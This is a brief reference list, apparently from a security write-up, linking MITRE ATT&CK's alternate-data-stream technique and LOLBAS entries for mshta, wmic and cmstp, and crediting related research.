- [MITRE ATT&CK T1564.004 — ADS](https://attack.mitre.org/techniques/T1564/004/)
- [LOLBAS — mshta](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
- [LOLBAS — wmic](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)
- [LOLBAS — cmstp](https://lolbas-project.github.io/lolbas/lolbas/Binaries/Cmstp/)
- Casey Smith — WMIC XSL research
- Oddvar Moe — CMSTP research
